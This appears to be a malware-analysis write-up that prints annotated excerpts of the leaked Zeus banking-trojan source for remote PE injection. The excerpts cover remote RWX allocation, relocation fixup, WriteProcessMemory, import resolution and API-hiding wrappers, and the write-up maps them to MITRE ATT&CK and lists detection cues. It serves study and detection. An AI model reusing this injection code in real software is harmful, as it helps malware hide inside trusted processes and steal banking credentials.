# Zeus (Zbot) - Remote PE Image Injection with Relocation Fixup

**Repository:** MalwareSourceCode-main (also in Malware-Collection-master/Zeus)  
**File Path:** Win32/Win32.Zeus.b/source/common/peimage.cpp  
**Language:** C++  
**MITRE ATT&CK:** T1055.002 - Process Injection: Portable Executable Injection

---

## Overview

Zeus (also known as Zbot) implements remote PE injection by copying an entire PE module into a target process's memory space with full relocation fixups. Unlike process hollowing, this technique allocates new memory in an existing process and injects a DLL or executable, adjusting all position-dependent code (relocations) to match the new base address. Zeus uses this for injecting its banking trojan modules into browsers and system processes.

---

## Code Snippet 1: Remote Memory Allocation for PE Image

```cpp
void *PeImage::_copyModuleToProcess(HANDLE process, void *image)
{
#if defined _WIN64
  PIMAGE_NT_HEADERS64 ntHeader = (PIMAGE_NT_HEADERS)((LPBYTE)image + ((PIMAGE_DOS_HEADER)image)->e_lfanew);
#else
  PIMAGE_NT_HEADERS32 ntHeader = (PIMAGE_NT_HEADERS)((LPBYTE)image + ((PIMAGE_DOS_HEADER)image)->e_lfanew);
#endif
  
  DWORD imageSize = ntHeader->OptionalHeader.SizeOfImage;
  bool ok         = false;

  // Validate the image is readable in current process memory
  if(CWA(kernel32, IsBadReadPtr)(image, imageSize) != 0)
     return NULL;
  
  // Allocate memory in the remote (target) process for the entire PE image
  // *** KEY INJECTION POINT: Remote memory allocation with RWX permissions ***
  LPBYTE remoteMem = (LPBYTE)CWA(kernel32, VirtualAllocEx)(
     process,                           // Target process handle
     NULL,                              // Let system choose address (avoid conflicts)
     imageSize,                         // Size: entire PE image
     MEM_RESERVE | MEM_COMMIT,         // Reserve + commit in one operation
     PAGE_EXECUTE_READWRITE            // RWX permissions for code execution
  );
  
  if(remoteMem != NULL)
  {
    // Continue to relocation processing...
  }
  
  return remoteMem;
}
```

**What it does:**  
Allocates executable memory in a remote process using **VirtualAllocEx** with `PAGE_EXECUTE_READWRITE` permissions. The size allocated matches the PE's `SizeOfImage` (total memory footprint including all sections). Unlike process hollowing, Zeus lets the system choose the allocation address (`NULL` as lpAddress parameter), avoiding conflicts with existing modules.

**Why it's T1055 (PE Injection):**  
This is the foundational step for PE injection. Zeus allocates RWX memory in the target process where it will later write a complete PE image (DLL or EXE). The `PAGE_EXECUTE_READWRITE` permission is a strong indicator of code injection, as legitimate Windows operations rarely require simultaneous write and execute permissions.

---

## Code Snippet 2: Local Copy Creation for Relocation Processing

```cpp
// Create a temporary local copy of the PE image for processing relocations
LPBYTE buf = (LPBYTE)Mem::copyEx(image, imageSize);
if(buf != NULL)
{
  // Get the relocation directory from PE headers
  IMAGE_DATA_DIRECTORY *relocsDir = &ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
  
  if(relocsDir->Size > 0 && relocsDir->VirtualAddress > 0)
  {
    // Calculate the delta between original ImageBase and new remote address
    DWORD_PTR delta    = (DWORD_PTR)((LPBYTE)remoteMem - ntHeader->OptionalHeader.ImageBase);
    DWORD_PTR oldDelta = (DWORD_PTR)((LPBYTE)image - ntHeader->OptionalHeader.ImageBase);
    
    // Relocate the image...
  }
}
```

**What it does:**  
Creates a local copy of the PE image using `Mem::copyEx` to avoid corrupting the original image in memory. Retrieves the **relocation directory** from the PE's data directories. Calculates two delta values:
- **delta:** Difference between new remote address and PE's preferred ImageBase
- **oldDelta:** Difference between current memory location and preferred ImageBase

These deltas are used to fix position-dependent addresses in the PE.

**Why it's T1055 (PE Injection):**  
PE relocation is critical for injecting DLLs/EXEs into remote processes. Since the PE will execute from a different address than its preferred ImageBase, all absolute addresses (pointers, jump tables, vtables) must be adjusted. This relocation fixup is a hallmark of sophisticated PE injection techniques.

**Technical Context:**  
Windows PE files contain a `.reloc` section listing all addresses that need adjustment when the image loads at a different base. Zeus manually processes these relocations, mimicking what the Windows loader does automatically.

---

## Code Snippet 3: Relocation Table Processing

```cpp
// Get pointer to the first relocation block
IMAGE_BASE_RELOCATION *relHdr = (IMAGE_BASE_RELOCATION *)(buf + relocsDir->VirtualAddress);

// Iterate through all relocation blocks
while(relHdr->VirtualAddress != 0)
{
  // Validate relocation block size
  if(relHdr->SizeOfBlock >= sizeof(IMAGE_BASE_RELOCATION))
  {
    // Calculate number of relocation entries in this block
    DWORD relCount = (relHdr->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
    
    // Get pointer to the relocation entry list
    LPWORD relList = (LPWORD)((LPBYTE)relHdr + sizeof(IMAGE_BASE_RELOCATION));
    
    // Process each relocation entry in the block...
  }
  
  // Move to next relocation block
  relHdr = (IMAGE_BASE_RELOCATION *)((LPBYTE)relHdr + relHdr->SizeOfBlock);
}
```

**What it does:**  
Iterates through the PE's **relocation table** (`.reloc` section). Each relocation block describes a page of memory containing addresses that need fixup. The code:
1. Parses the relocation block header (`IMAGE_BASE_RELOCATION`)
2. Calculates the number of relocation entries (`relCount`)
3. Gets a pointer to the relocation entry list (`relList`)
4. Advances to the next block after processing

**Why it's T1055 (PE Injection):**  
Manual relocation table parsing is characteristic of advanced PE injection techniques. Zeus is manually performing what the Windows loader normally does automatically. This shows deep understanding of PE format and is necessary for injecting code that wasn't designed to run at arbitrary addresses.

**Relocation Block Structure:**
```
struct IMAGE_BASE_RELOCATION {
    DWORD VirtualAddress;   // Page RVA where relocations apply
    DWORD SizeOfBlock;      // Total block size including entries
    WORD  TypeOffset[...];  // Array of relocation entries
};
```

---

## Code Snippet 4: Individual Relocation Fixup

```cpp
// Process each relocation entry in the current block
for(DWORD i = 0; i < relCount; i++)
{
  if(relList[i] > 0)  // Skip entries with type 0 (padding)
  {
    // Calculate the address to fix
    // relHdr->VirtualAddress = page RVA
    // (0x0FFF & relList[i]) = offset within page (low 12 bits)
    DWORD_PTR *p = (DWORD_PTR *)(buf + (relHdr->VirtualAddress + (0x0FFF & (relList[i]))));
    
    // Undo old relocation: subtract the old delta
    *p -= oldDelta;
    
    // Apply new relocation: add the new delta
    *p += delta;
  }
}
```

**What it does:**  
For each relocation entry:
1. **Extracts the offset:** The low 12 bits (`0x0FFF & relList[i]`) give the offset within the 4KB page
2. **Calculates absolute address:** Adds page RVA + offset to get the address needing fixup
3. **Undoes old relocation:** Subtracts `oldDelta` to get the original address
4. **Applies new relocation:** Adds `delta` to adjust for the new remote base address

**Why it's T1055 (PE Injection):**  
This is the core relocation fixup logic. Zeus is manually patching every pointer in the PE image to adjust for the new base address. Without this, the injected code would crash when it tries to access data or call functions using incorrect absolute addresses.

**Relocation Entry Format:**
```
TypeOffset (WORD):
- High 4 bits: Relocation type (IMAGE_REL_BASED_HIGHLOW for 32-bit, IMAGE_REL_BASED_DIR64 for 64-bit)
- Low 12 bits: Offset within the 4KB page
```

**Example:**
If a relocation entry is `0x3120`:
- Type: `0x3` (IMAGE_REL_BASED_HIGHLOW - 32-bit absolute address)
- Offset: `0x120` (288 bytes into the page)

---

## Code Snippet 5: Writing Relocated Image to Remote Process

```cpp
// After all relocations are fixed, write the corrected PE to the remote process
ok = CWA(kernel32, WriteProcessMemory)(
   process,        // Target process handle
   remoteMem,      // Destination: allocated memory in target
   buf,            // Source: relocated PE image (local copy)
   imageSize,      // Size: entire PE image
   NULL            // Don't care about bytes written
) ? true : false;

Mem::free(buf);  // Free the temporary local copy

if(!ok)
{
  // If write failed, free the remote memory and return NULL
  CWA(kernel32, VirtualFreeEx)(process, (void *)remoteMem, 0, MEM_RELEASE);
  remoteMem = NULL;
}

return remoteMem;  // Return remote base address (NULL on failure)
```

**What it does:**  
After processing all relocations in the local copy (`buf`), writes the **corrected PE image** to the remote process using **WriteProcessMemory**. The entire image (headers + sections with fixed relocations) is written in one operation. Frees the local copy and handles errors by releasing remote memory on failure.

**Why it's T1055 (PE Injection):**  
This is the injection step where the malicious PE is transferred into the target process's memory. Unlike process hollowing which writes to a suspended process, this technique injects into already-running processes. The injected PE is fully functional with corrected relocations, ready to execute.

---

## Code Snippet 6: Import Resolution Framework (Loader Support)

```cpp
typedef HMODULE (WINAPI *liLoadLibraryA)(LPSTR);
typedef void *(WINAPI *liGetProcAddress)(HMODULE, LPSTR);

bool PeImage::_loadImport(void *image, void *loadLibraryA, void *getProcAddress)
{
#if defined _WIN64
  PIMAGE_NT_HEADERS64 ntHeader = (PIMAGE_NT_HEADERS64)((LPBYTE)image + ((PIMAGE_DOS_HEADER)image)->e_lfanew);
#else
  PIMAGE_NT_HEADERS32 ntHeader = (PIMAGE_NT_HEADERS32)((LPBYTE)image + ((PIMAGE_DOS_HEADER)image)->e_lfanew);
#endif
  
  // Get the import directory from PE headers
  IMAGE_DATA_DIRECTORY *importDir = &ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
  
  if(loadLibraryA && getProcAddress && 
     importDir->VirtualAddress > 0 && 
     importDir->Size > sizeof(IMAGE_IMPORT_DESCRIPTOR))
  {
    // Iterate through import descriptors for each DLL
    for(IMAGE_IMPORT_DESCRIPTOR *iid = (IMAGE_IMPORT_DESCRIPTOR *)((LPBYTE)image + importDir->VirtualAddress); 
        iid->Characteristics != 0; 
        iid++)
    {
      // Load each imported DLL and resolve function addresses...
    }
  }
}
```

**What it does:**  
Provides a framework for manually resolving PE imports after injection. Accepts function pointers for `LoadLibraryA` and `GetProcAddress`, then iterates through the PE's **import directory** to:
1. Load dependent DLLs
2. Resolve imported function addresses
3. Update the Import Address Table (IAT)

**Why it's T1055 (PE Injection):**  
After injecting a PE, its imports (dependencies on system DLLs like kernel32.dll, ntdll.dll, user32.dll) must be resolved. Zeus provides this `_loadImport` helper to manually fix imports, mimicking the Windows loader. This is necessary because the injected PE won't go through normal DLL loading, so imports remain unresolved without manual intervention.

**Import Resolution Workflow:**
1. Parse import directory (`IMAGE_DIRECTORY_ENTRY_IMPORT`)
2. For each DLL dependency:
   - Call `LoadLibraryA` to load the DLL
   - Iterate through imported functions
   - Call `GetProcAddress` to get function addresses
   - Write addresses to the Import Address Table (IAT)

This manual import resolution is a hallmark of reflective DLL injection and PE injection techniques.

---

## Code Snippet 7: CWA Macro - API Call Wrapper for Evasion

```cpp
// Throughout the code, API calls are wrapped with CWA macro:
CWA(kernel32, VirtualAllocEx)(process, NULL, imageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
CWA(kernel32, WriteProcessMemory)(process, remoteMem, buf, imageSize, NULL);
CWA(kernel32, IsBadReadPtr)(image, imageSize);
CWA(kernel32, VirtualFreeEx)(process, (void *)remoteMem, 0, MEM_RELEASE);
```

**What it does:**  
The **CWA macro** (likely "Call Windows API") wraps all Windows API calls. This is typically used for:
- **Dynamic API resolution:** Resolving APIs at runtime via `GetProcAddress` instead of import table
- **Anti-hooking:** Bypassing usermode API hooks by calling APIs directly
- **Obfuscation:** Hiding API usage from static analysis

**Why it's T1055 (Evasion Enhancement):**  
The CWA wrapper enhances the injection technique's stealth:
- **Bypasses Import Scanning:** APIs don't appear in the PE's import table, evading IAT-based detections
- **Evades API Hooks:** If security products hook APIs in the normal import path, CWA can bypass them by resolving APIs dynamically
- **Hinders Static Analysis:** Makes it harder for analysts to identify injection-related APIs without executing the malware

**Common CWA Implementation:**
```cpp
#define CWA(dll, func) \
    ((decltype(func)*)GetAPIAddress(#dll, #func))
    
// Where GetAPIAddress dynamically resolves the API
```

This pattern is extremely common in advanced malware (Zeus, Dridex, TrickBot, Emotet) to evade detection and analysis.

---

## Explanation

**What this code does:**  
Zeus implements **remote PE injection** to copy entire PE modules (DLLs or executables) into target processes with full relocation fixup. The technique:

1. **Allocates Remote Memory:** Uses `VirtualAllocEx` to allocate RWX memory in the target process

2. **Creates Local Copy:** Makes a temporary copy of the PE image for processing

3. **Processes Relocations:** Iterates through the relocation table, adjusting all position-dependent addresses for the new base address

4. **Writes Relocated PE:** Uses `WriteProcessMemory` to inject the corrected PE into the target process

5. **Resolves Imports (Optional):** Provides framework for manually fixing imports after injection

6. **Evades Detection:** Uses CWA macro to dynamically resolve APIs and bypass hooks

**How it implements T1055 (Process Injection):**  
This is a **T1055.002 - Portable Executable Injection** technique, distinct from process hollowing:

**Differences from Process Hollowing:**
- **No Process Creation:** Injects into existing processes, not newly created suspended processes
- **No Unmapping:** Doesn't remove original code with `NtUnmapViewOfSection`
- **Relocation-Based:** Focuses on fixing relocations for arbitrary base addresses
- **DLL-Oriented:** Designed for injecting DLL modules, not replacing entire processes

**Advantages of Zeus's Approach:**
1. **Flexible Base Address:** Can inject at any address (not tied to preferred ImageBase)
2. **No Unmapping Required:** Works with running processes without hollowing
3. **Module-Based:** Can inject multiple DLLs into the same process
4. **Relocation Support:** Handles position-independent code correctly

**Zeus Banking Trojan Context:**  
Zeus (Zbot) is one of the most notorious banking trojans, first detected in 2007. It pioneered many modern malware techniques including:
- **Browser Process Injection:** Injecting into iexplore.exe, firefox.exe, chrome.exe to intercept banking traffic
- **System Process Injection:** Injecting into explorer.exe, winlogon.exe, svchost.exe for persistence
- **Web Injects:** Modifying bank websites in-memory to steal credentials
- **Man-in-the-Browser (MitB):** Intercepting HTTP/HTTPS before encryption

The PE injection technique allows Zeus to:
- Execute malicious code within trusted processes
- Inherit process privileges and security context
- Evade process-based detections
- Persist across process restarts (by re-injecting)

**APIs that make it a strong T1055 match:**  
- **VirtualAllocEx** with `PAGE_EXECUTE_READWRITE` — Remote executable memory allocation
- **WriteProcessMemory** — Writing PE image to remote process
- **Dynamic API Resolution** (CWA macro) — Evading import-based detection
- **Manual Relocation Processing** — Fixing position-dependent code
- **Manual Import Resolution** — `_loadImport` function for IAT fixup

**Relocation Processing Significance:**  
The relocation fixup code is particularly important because:

1. **Address Space Layout Randomization (ASLR):** Modern Windows uses ASLR, meaning DLLs/EXEs load at random addresses. Relocations are essential for this.

2. **Module Conflicts:** If the preferred ImageBase is already occupied, the loader (or Zeus) must relocate the image.

3. **Position-Independent Code:** Without relocation support, the injected code would crash when accessing absolute addresses.

4. **Professional Quality:** The detailed relocation handling shows this is production-grade malware code, not a proof-of-concept.

**Malware Family Resemblance:**  
Zeus's PE injection technique influenced many successor malware families:

- **Citadel** - Zeus variant with similar PE injection
- **Dridex** - Uses Zeus-style relocation fixup
- **TrickBot** - Advanced PE injection inherited from Zeus/Dridex
- **Emotet** - PE injection with CWA-style API resolution
- **Gozi-ISFB** - Sophisticated PE injection with manual loading
- **Carberp** - Banking trojan with Zeus-inspired injection

The CWA macro pattern became standard in malware development, appearing in most modern banking trojans and RATs.

**Detection Opportunities:**  
- `VirtualAllocEx` allocations with `PAGE_EXECUTE_READWRITE` from non-debugger processes
- `WriteProcessMemory` writing PE signatures (MZ header, "This program cannot be run in DOS mode")
- Memory regions in trusted processes (browsers, explorer.exe, svchost.exe) with:
  - Executable permissions (`PAGE_EXECUTE_*`)
  - No backing file on disk
  - Mismatched ImageBase vs preferred base
- Processes with multiple unbacked executable memory regions (multi-module injection)
- Dynamic API resolution patterns (GetProcAddress calls with encrypted strings)
- Browser processes with unexpected DLLs loaded or memory regions

**MITRE ATT&CK Mapping:**  
- **T1055** - Process Injection (Primary)
- **T1055.002** - Process Injection: Portable Executable Injection (Specific Sub-technique)
- **T1055.001** - Process Injection: Dynamic-link Library Injection (DLL variant)
- **T1027.007** - Obfuscated Files or Information: Dynamic API Resolution (CWA macro)
- **T1106** - Native API (Direct Windows API usage for injection)
- **T1185** - Browser Session Hijacking (Ultimate goal when injecting into browsers)
- **T1056.002** - Input Capture: GUI Input Capture (Keylogging after injection)
- **T1539** - Steal Web Session Cookie (Banking credential theft)
